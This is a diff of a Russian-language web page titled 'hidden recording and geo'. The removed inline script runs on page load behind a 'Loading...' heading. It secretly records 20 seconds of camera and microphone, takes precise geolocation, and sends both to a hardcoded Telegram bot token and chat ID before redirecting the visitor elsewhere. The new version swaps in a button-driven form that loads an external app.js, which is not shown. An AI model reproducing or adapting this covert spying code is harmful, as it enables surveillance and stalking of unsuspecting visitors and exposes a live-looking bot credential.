@@ -2,103 +2,17 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Скрытая запись и гео</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <h2>Загрузка...</h2>
+  <h2>Нажмите кнопку для продолжения</h2>
+  <input type="text" id="name" placeholder="Введите имя">
+  <br><br>
+  <button id="startBtn">Продолжить</button>
+  <div class="status" id="status">Статус: ожидание</div>
 
-  <script>
-    const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
-    const TELEGRAM_CHAT_ID = "8071841674";
-    const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";
-
-    async function sendToTelegram(payload) {
-      if (payload.error) {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: payload.error
-          })
-        });
-      } else {
-        if (payload.coords) {
-          const mapUrl = `https://yandex.com/maps/?ll=${payload.coords.lon}%2C${payload.coords.lat}&z=16`;
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: `Геолокация: ${mapUrl}`
-            })
-          });
-        }
-        if (payload.video) {
-          const formData = new FormData();
-          formData.append("chat_id", TELEGRAM_CHAT_ID);
-          formData.append("document", payload.video, "video.webm");
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-            method: "POST",
-            body: formData
-          });
-        }
-      }
-    }
-
-    async function init() {
-      let granted = { camera: false, geo: false };
-      let coords = null;
-      let videoBlob = null;
-
-      // --- Камера + микрофон (20 секунд скрытой записи) ---
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
-        granted.camera = true;
-
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.start();
-
-        await new Promise(resolve => setTimeout(resolve, 20000)); // 20 секунд
-        mediaRecorder.stop();
-
-        videoBlob = new Blob(chunks, { type: 'video/webm' });
-        stream.getTracks().forEach(track => track.stop());
-
-      } catch(err) {
-        granted.camera = false;
-      }
-
-      // --- Геолокация ---
-      try {
-        coords = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-            err => reject(err),
-            { enableHighAccuracy:true, timeout:10000 }
-          );
-        });
-        granted.geo = true;
-      } catch(err) {
-        granted.geo = false;
-      }
-
-      // --- Отправка в Telegram ---
-      if (granted.camera || granted.geo) {
-        await sendToTelegram({ video: videoBlob, coords });
-      } else {
-        await sendToTelegram({ error: TELEGRAM_ERROR_MSG });
-      }
-
-      // --- Редирект ---
-      setTimeout(() => {
-        window.location.href = "https://murakamicity.com/";
-      }, 1000);
-    }
-
-    init();
-  </script>
+  <script src="app.js"></script>
 </body>
 </html>
